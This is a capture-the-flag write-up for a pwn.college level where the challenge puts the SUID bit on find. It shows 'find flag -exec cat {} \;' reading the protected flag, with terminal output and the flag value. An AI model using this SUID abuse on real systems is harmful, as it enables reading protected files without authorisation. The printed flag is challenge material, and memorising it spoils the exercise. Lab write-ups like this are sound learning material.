`find`

`find` is a versatile and powerful tool in linux. It is used to search for files and directories. It allows users to search files based on various criteria like name, size, type etc. We don't go deeper.

In this problem, we have to print the content of the `flag` file using `find` command. `find` actually finds the file. Now we want to execute some file reading program like `cat`, `more` etc.

I ran through the `man find` and search for `command`. After writing `man find` in the terminal, you write `/` and then you can search for any word you want. I wrote `/command`. After continuously pressing `n` means next and `N` means previous, I found `-exec command`. 

Gotcha! We are looking for this.

After reading, I found `See the EXAMPLES section for examples of the use of the -exec option`.

Then I went through `EXAMPLES` and found the proper command `$find flag -exec cat '{}' \;`

Here, `{}` is a placeholder that gets replaced by the path to the current file found by the `find`.
`\;(semicolon)` it is used to terminate the `-exec` command. The `\` before the `;` is necessary to ensure that the semicolon is treated as a literal character and not as a special character in the shell.

And then you found the flag :)

```bash
hacker@program-misuse-level-25:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-25:/$ cd challenge/
hacker@program-misuse-level-25:/challenge$ ls
babysuid_level25
hacker@program-misuse-level-25:/challenge$ ./babysuid_level25 
Welcome to ./babysuid_level25!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/find.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level25) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/find!
hacker@program-misuse-level-25:/challenge$ cd /
hacker@program-misuse-level-25:/$ find flag
flag
hacker@program-misuse-level-25:/$ find flag -exec cat '{}' \;
pwn.college{EPnLVFqqM9udNFLsOEDAVpxMMYK.01N2EDL0AjNzQzW}
```

```bash
hacker@program-misuse-level-25:/$ find . -name 'flag' -exec cat /flag \;
pwn.college{EPnLVFqqM9udNFLsOEDAVpxMMYK.01N2EDL0AjNzQzW}
```

